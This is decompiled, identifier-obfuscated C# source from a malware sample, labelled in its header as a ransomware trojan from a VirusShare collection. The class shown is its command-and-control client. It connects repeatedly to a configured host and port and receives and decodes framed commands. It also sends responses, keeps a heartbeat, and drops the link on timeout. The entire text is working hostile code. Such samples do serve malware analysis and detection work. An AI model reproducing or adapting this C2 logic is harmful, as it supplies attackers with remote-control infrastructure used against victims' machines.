// Decompiled with JetBrains decompiler
// Type: ր֬ᏉṢᡄẼ஗ᱻసҡƬོᒉࢲʗᎎཛྷ.Ⴇᘆ៨᜞ၹᑬᲪᲯ
// Assembly: update, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 7E0159D6-932F-4F32-8DCB-751F61B22DA0
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-1e13fd2b44573360e0d5f6cc2d3a4e1161d119837d808fac0c43885d53ec395f.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using ր֬ᏉṢᡄẼ\u0B97ᱻసҡƬོᒉࢲʗᎎཛྷ;

namespace ր֬ᏉṢᡄẼ\u0B97ᱻసҡƬོᒉࢲʗᎎཛྷ
{
  internal class Ⴇᘆ៨\u171Eၹᑬ\u1CAA\u1CAF
  {
    private Socket ᖵᄳ്േڒඓෆ\u0DE2ᕟߪ;
    private bool ᙙ\u0872\u070CΚᑮ\u0CDAӯˀᣖό᳡;
    private Thread \u0C42ᆪᶦ\u1391ˑؼឱᡀ;
    private Thread \u1362ᅟঌא\u09C9ሥᐲ;
    private Thread ᣊၬݹԣᰓੈᭀἋ؀\u0EAC\u1AA8ᶈᦝ༦;
    private string \u1814९Ċ\u1ADCࠫ\u1942\u0AF4ަᳮ;
    private int \u07BD\u02F6ᙒ\u1CC0ᴊત\u19F5\u0FFDໜ\u000Bአᕧ;
    private string \u0F6EݢɥᏅᰐᛏ;
    private bool \u19F8ଧмࢭႸᮠ\u08BEᚈఆᤡූ\u08C6\u09CAᕺᑖݑӭɋ;

    public Ⴇᘆ៨\u171Eၹᑬ\u1CAA\u1CAF(string Host, int Port, string Password)
    {
      this.\u1814९Ċ\u1ADCࠫ\u1942\u0AF4ަᳮ = Host;
      this.\u07BD\u02F6ᙒ\u1CC0ᴊત\u19F5\u0FFDໜ\u000Bአᕧ = Port;
      this.\u0F6EݢɥᏅᰐᛏ = Password;
      this.ᙙ\u0872\u070CΚᑮ\u0CDAӯˀᣖό᳡ = false;
      this.\u19F8ଧмࢭႸᮠ\u08BEᚈఆᤡූ\u08C6\u09CAᕺᑖݑӭɋ = false;
    }

    public Socket \u1927\u0881่դ\u0E6A̫\u19E4\u0EE7ۃᄔ\u0867\u0E5Dएᅦᨶᗾ => this.ᖵᄳ്േڒඓෆ\u0DE2ᕟߪ;

    public bool Ϸڂ\u0DF9ჰ᷉\u1B7CŁӰਲ਼ɃᜉᎭᄱ\u19FBᒚ\u0B84෦ӹဟ => this.ᙙ\u0872\u070CΚᑮ\u0CDAӯˀᣖό᳡;

    public string άŔণཚჯۅѥĔ५\u08BCᨲ\u17FAᘔУ\u0FE5 => this.\u1814९Ċ\u1ADCࠫ\u1942\u0AF4ަᳮ;

    public int \u0711\u070E\u1A9Eౄഇtзç\u02DB᩹ᓑᙘግ\u02D9 => this.\u07BD\u02F6ᙒ\u1CC0ᴊત\u19F5\u0FFDໜ\u000Bአᕧ;

    public string \u0C6Cਗ\u00B4\u1B79ʢᰟᷞ\u0001ᜃ\u1716\u002C\u1AC4Ŷݑṏ᳘\u0D0D => this.\u0F6EݢɥᏅᰐᛏ;

    public void ᡬ\u0B98ʎ\u0CD3ມឿ\u19E2ᚣ\u0005ႆધಱቮষᖽኛ() => this.ᄿǩሓȃҤ();

    private void ᄿǩሓȃҤ()
    {
      if (this.ᙙ\u0872\u070CΚᑮ\u0CDAӯˀᣖό᳡)
        return;
      this.ᣊၬݹԣᰓੈᭀἋ؀\u0EAC\u1AA8ᶈᦝ༦ = new Thread((ThreadStart) (() =>
      {
        this.ᖵᄳ്േڒඓෆ\u0DE2ᕟߪ = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        while (!this.ᖵᄳ്േڒඓෆ\u0DE2ᕟߪ.Connected)
        {
          try
          {
            this.ᖵᄳ്േڒඓෆ\u0DE2ᕟߪ.Connect(this.\u1814९Ċ\u1ADCࠫ\u1942\u0AF4ަᳮ, this.\u07BD\u02F6ᙒ\u1CC0ᴊત\u19F5\u0FFDໜ\u000Bአᕧ);
          }
          catch
          {
            Thread.Sleep(TimeSpan.FromSeconds((double) \u0306๔\u196Fሇ\u19F0᳧ͅɣļᔃ\u1C88ேR.Ѿѡዹӌི\u0FC4\u1A8A\u09F4Ȗቼ));
          }
        }
        this.ᵫ\u1CCAݹ\u1B4Eᅮமڶᥑᵸ\u0C4EȪ();
      }));
      this.ᣊၬݹԣᰓੈᭀἋ؀\u0EAC\u1AA8ᶈᦝ༦.Start();
    }

    private void ᵫ\u1CCAݹ\u1B4Eᅮமڶᥑᵸ\u0C4EȪ()
    {
      if (this.ᙙ\u0872\u070CΚᑮ\u0CDAӯˀᣖό᳡)
        return;
      this.ᙙ\u0872\u070CΚᑮ\u0CDAӯˀᣖό᳡ = true;
      if (this.Ј\u00B2ඊી\u0F1Bᕒʬێ == null)
        return;
      this.Ј\u00B2ඊી\u0F1Bᕒʬێ((object) this, (EventArgs) null);
    }

    public void \u1B6CΞ\u09D0᷆ឞহᇡ()
    {
      this.\u0C42ᆪᶦ\u1391ˑؼឱᡀ = new Thread(new ThreadStart(this.ᰏ\u0704ཨἳඪລᐡ֜Ț\u0BA0ᔘᬥૉ᠔ួጬ));
      this.\u0C42ᆪᶦ\u1391ˑؼឱᡀ.Start();
      this.\u1362ᅟঌא\u09C9ሥᐲ = new Thread((ThreadStart) (() =>
      {
        while (true)
        {
          Thread.Sleep(TimeSpan.FromSeconds(45.0));
          if (this.\u19F8ଧмࢭႸᮠ\u08BEᚈఆᤡූ\u08C6\u09CAᕺᑖݑӭɋ)
            this.\u19F8ଧмࢭႸᮠ\u08BEᚈఆᤡූ\u08C6\u09CAᕺᑖݑӭɋ = false;
          else
            break;
        }
        this.\u0ACAਂ\u0DFFᛜ\u07B6Ρኆ༹(true);
      }));
      this.\u1362ᅟঌא\u09C9ሥᐲ.Start();
    }

    private void ᰏ\u0704ཨἳඪລᐡ֜Ț\u0BA0ᔘᬥૉ᠔ួጬ()
    {
      try
      {
        MemoryStream ms = new MemoryStream();
        byte[] array;
        do
        {
          array = new byte[this.ᖵᄳ്േڒඓෆ\u0DE2ᕟߪ.ReceiveBufferSize];
          int num = this.ᖵᄳ്േڒඓෆ\u0DE2ᕟߪ.Receive(array, 0, array.Length, SocketFlags.Partial);
          if (num <= 0)
            throw new SocketException();
          Array.Resize<byte>(ref array, num);
          ms.Write(array, 0, num);
        }
        while (!(char.ConvertFromUtf32((int) array[array.Length - 1]) == "\n"));
        ms.Close();
        new Thread((ThreadStart) (() =>
        {
          this.ᆃᮘᄡኣᣎጋໂᒗॎ\u00B7ฮ\u001CξᏱၟ९ᤑ(ms.ToArray());
          ms.Dispose();
          ms = (MemoryStream) null;
        })).Start();
      }
      catch (SocketException ex)
      {
        this.\u0ACAਂ\u0DFFᛜ\u07B6Ρኆ༹(true);
        return;
      }
      catch (Exception ex)
      {
        this.\u0ACAਂ\u0DFFᛜ\u07B6Ρኆ༹(true);
        Console.WriteLine(ex.Message);
      }
      this.ᰏ\u0704ཨἳඪລᐡ֜Ț\u0BA0ᔘᬥૉ᠔ួጬ();
    }

    private void ᆃᮘᄡኣᣎጋໂᒗॎ\u00B7ฮ\u001CξᏱၟ९ᤑ(byte[] _param1)
    {
      List<byte> byteList = new List<byte>();
      for (int index = 0; index < _param1.Length; ++index)
      {
        if (char.ConvertFromUtf32((int) _param1[index]) != "\n")
        {
          byteList.Add(_param1[index]);
        }
        else
        {
          this.\u05C2\u0BE3ᅭᎁᕰᏱཏЈᎉ້ᡪ४\u1C38ہ̛ಎ(byteList.ToArray());
          byteList.Clear();
        }
      }
    }

    private void \u05C2\u0BE3ᅭᎁᕰᏱཏЈᎉ້ᡪ४\u1C38ہ̛ಎ(byte[] һܭᴥᰯရᘳᒉ)
    {
      try
      {
        MemoryStream memoryStream = new MemoryStream(\u0489ՄგᓍᪧᏈᭋᱣᆍᕫ\u0E73\u18AB.Ꮷ\u0DCCڪᘺౢᇺ\u1AFEơॊ(һܭᴥᰯရᘳᒉ, true));
        byte[] buffer = new byte[4];
        memoryStream.Read(buffer, 0, buffer.Length);
        Ⴇᘆ៨\u171Eၹᑬ\u1CAA\u1CAF.थŉៀ\u0897ᚇᖃیȢ\u1C85ঔᔆ᳦\u0B78ᙏᦧᗃ int32 = (Ⴇᘆ៨\u171Eၹᑬ\u1CAA\u1CAF.थŉៀ\u0897ᚇᖃیȢ\u1C85ঔᔆ᳦\u0B78ᙏᦧᗃ) BitConverter.ToInt32(buffer, 0);
        byte[] numArray = new byte[memoryStream.Length - 4L];
        memoryStream.Read(numArray, 0, numArray.Length);
        memoryStream.Close();
        memoryStream.Dispose();
        if (int32 != Ⴇᘆ៨\u171Eၹᑬ\u1CAA\u1CAF.थŉៀ\u0897ᚇᖃیȢ\u1C85ঔᔆ᳦\u0B78ᙏᦧᗃ.\u166Eᤁ\u1C80ᘲᔟ\u19DE)
        {
          if (this.\u0010\u1CB7ᅺᏚ\u12C7ᮖ౭fᑠኛซᓒᜢ̎ـᎥỲ != null)
            this.\u0010\u1CB7ᅺᏚ\u12C7ᮖ౭fᑠኛซᓒᜢ̎ـᎥỲ((object) this, new \u1398ẽἛ\u0C3CK\u0B11ᐵᏢᐸॲൽ\u02C4ᒪԻ೨(numArray, numArray.Length, int32));
        }
        else
        {
          this.\u19F8ଧмࢭႸᮠ\u08BEᚈఆᤡූ\u08C6\u09CAᕺᑖݑӭɋ = true;
          this.\u1AEEƝ\u0F0Aཥᕶ\u0B98ೣϺ\u0A58໘᷐\u0CD4ඣ();
        }
        һܭᴥᰯရᘳᒉ = (byte[]) null;
      }
      catch
      {
        \u0593\u0BCF\u166Eۢᮝᄒᢇᙂᘛւજ\u1CA1 obj = new \u0593\u0BCF\u166Eۢᮝᄒᢇᙂᘛւજ\u1CA1();
        obj.Write("Broken Packet");
        this.ቻᴁ႙\u0BE0ᨓ\u001Bᅢສଷ(new ᗯ\u0D45ࠞච\u0DBCȁ(Ⴇᘆ៨\u171Eၹᑬ\u1CAA\u1CAF.थŉៀ\u0897ᚇᖃیȢ\u1C85ঔᔆ᳦\u0B78ᙏᦧᗃ.Ǹ\u0889ȥౡጴྵ\u0E6Eᕪഗ, obj.ᓶᑵഠἑ\u0703\u0C49ᙟ\u003AN႗ᛏ\u0081̹()).\u1035ଝᨪᐛ\u1A5FϨâཊᣅዹΊၫฎᒛ());
      }
    }

    public int ቻᴁ႙\u0BE0ᨓ\u001Bᅢສଷ(byte[] _param1)
    {
      try
      {
        int sent = this.ᖵᄳ്േڒඓෆ\u0DE2ᕟߪ.Send(_param1, 0, _param1.Length, SocketFlags.Partial) + this.ᖵᄳ്േڒඓෆ\u0DE2ᕟߪ.Send(this.ŢѳۘছϚࡃ̸ᱝ\u08BC, 0, 1, SocketFlags.Partial);
        if (this.\u03F6ᓺᅴ\u09DAஜ౦ != null && sent != 0)
          this.\u03F6ᓺᅴ\u09DAஜ౦((object) this, new \u1805ᡒ၅իᡨদƈᗸጏदᵶᛊᵙᎡ(sent));
        return sent;
      }
      catch
      {
        return 0;
      }
    }

    private byte[] ŢѳۘছϚࡃ̸ᱝ\u08BC => Encoding.ASCII.GetBytes("\n");

    private void \u1AEEƝ\u0F0Aཥᕶ\u0B98ೣϺ\u0A58໘᷐\u0CD4ඣ() => this.ቻᴁ႙\u0BE0ᨓ\u001Bᅢສଷ(new ᗯ\u0D45ࠞච\u0DBCȁ(Ⴇᘆ៨\u171Eၹᑬ\u1CAA\u1CAF.थŉៀ\u0897ᚇᖃیȢ\u1C85ঔᔆ᳦\u0B78ᙏᦧᗃ.\u166Eᤁ\u1C80ᘲᔟ\u19DE, new byte[0]).\u1035ଝᨪᐛ\u1A5FϨâཊᣅዹΊၫฎᒛ());

    public void \u0DCFěᙝД൦ʡẆǻ\u0A34֧ཞḙ(string _param1)
    {
      \u0593\u0BCF\u166Eۢᮝᄒᢇᙂᘛւજ\u1CA1 obj = new \u0593\u0BCF\u166Eۢᮝᄒᢇᙂᘛւજ\u1CA1();
      obj.Write(_param1);
      this.ቻᴁ႙\u0BE0ᨓ\u001Bᅢສଷ(new ᗯ\u0D45ࠞච\u0DBCȁ(Ⴇᘆ៨\u171Eၹᑬ\u1CAA\u1CAF.थŉៀ\u0897ᚇᖃیȢ\u1C85ঔᔆ᳦\u0B78ᙏᦧᗃ.Ǹ\u0889ȥౡጴྵ\u0E6Eᕪഗ, obj.ᓶᑵഠἑ\u0703\u0C49ᙟ\u003AN႗ᛏ\u0081̹()).\u1035ଝᨪᐛ\u1A5FϨâཊᣅዹΊၫฎᒛ());
    }

    public bool \u0ACAਂ\u0DFFᛜ\u07B6Ρኆ༹(bool ḷǭᛮїᒀבᴟ)
    {
      if (!this.ᙙ\u0872\u070CΚᑮ\u0CDAӯˀᣖό᳡)
        return false;
      this.ʪឲĶᗛോ();
      this.ᙙ\u0872\u070CΚᑮ\u0CDAӯˀᣖό᳡ = false;
      if (ḷǭᛮїᒀבᴟ && this.\u137A\u05C6ռรဖ\u00A4ᐰᯕ\u1DFAඥఇũǥ != null)
        this.\u137A\u05C6ռรဖ\u00A4ᐰᯕ\u1DFAඥఇũǥ((object) this, (EventArgs) null);
      return true;
    }

    public void ʪឲĶᗛോ()
    {
      try
      {
        this.ᖵᄳ്േڒඓෆ\u0DE2ᕟߪ.Close();
        this.ᖵᄳ്േڒඓෆ\u0DE2ᕟߪ = (Socket) null;
      }
      catch
      {
      }
      try
      {
        this.\u0C42ᆪᶦ\u1391ˑؼឱᡀ.Abort();
        this.\u0C42ᆪᶦ\u1391ˑؼឱᡀ = (Thread) null;
      }
      catch
      {
      }
      try
      {
        this.\u1362ᅟঌא\u09C9ሥᐲ.Abort();
        this.\u1362ᅟঌא\u09C9ሥᐲ = (Thread) null;
      }
      catch
      {
      }
    }

    public event EventHandler ConnectionAccepted;

    public event EventHandler Disconnected;

    public event EventHandler<\u1805ᡒ၅իᡨদƈᗸጏदᵶᛊᵙᎡ> Sent;

    public event EventHandler<\u1398ẽἛ\u0C3CK\u0B11ᐵᏢᐸॲൽ\u02C4ᒪԻ೨> Received;

    public enum थŉៀ\u0897ᚇᖃیȢ\u1C85ঔᔆ᳦\u0B78ᙏᦧᗃ
    {
      ᇂᄪɶଝʘ = 0,
      دᬷഎႥṑ\u02D9ઠᚺܢ\u16FCᩪş\u0EE4ᴱc = 1,
      \u1AA0ӗᣆᮑḽ\u1B7Dជ = 2,
      \u175Fᰦ\u0BDEᎱତᦍᏘຊጪᯰȞᝊ\u0C7A௪Լө\u10CE = 3,
      ጧـႬࢣႺἄñౘᗊ᳟ᆗنូ = 4,
      ίመᢅȫᘻᘯகೕ̣ = 5,
      \u0D74ሴᬒࡘᠯຶớᏜૃఝ = 6,
      ᅆঈົ୬ఙ\u12BFḌσᘹ = 7,
      \u0CE4дᝬ\u139Aᦡኤ̑෮\u19DEڊْ̜ӌᩮ᷅ϱ\u17D9\u1368 = 8,
      ᵄ\u1CFB\u1AC2ஞƝᆨ\u0890\u09CA = 9,
      ࡎፁᦈ\u1C8Fю߃᭮ঙᩊᴼௗਃ\u005Eᳶ = 15, // 0x0000000F
      ਡͯೈऑ\u0C29\u0EED\u0090\u0DFFΦᏽ᷍᭑ᯉ\u05EDဥ = 16, // 0x00000010
      ȂสҼᎌ೦ࠨᨦ = 17, // 0x00000011
      \u1BEFᠵṷᅡ\u17D5ᗏǱᄑ\u08D9\u0C52 = 18, // 0x00000012
      \u166Eᤁ\u1C80ᘲᔟ\u19DE = 19, // 0x00000013
      Jϛᓛଂź\u170Dઝ\u060BỚ\u037Eϓᕽ = 20, // 0x00000014
      Ǹ\u0889ȥౡጴྵ\u0E6Eᕪഗ = 21, // 0x00000015
      \u0CBBቷྲྀȠ\u18F6\u0BD1Ӂ\u1737ໜᣭᱠߝᙋ = 22, // 0x00000016
      ჭᚻݪۄᇉᘴᶳഽኛ̹ǔ\u0DE5ᛜဟ\u02FE = 23, // 0x00000017
      \u0B70ᦛታᄏࠟ៊ᅃ = 24, // 0x00000018
      ღ\u197Aᨘஇᐷᯏ\u0BF8ᥛᅾ\u0C5D᪴᮸ࡊުΠ = 25, // 0x00000019
    }
  }
}
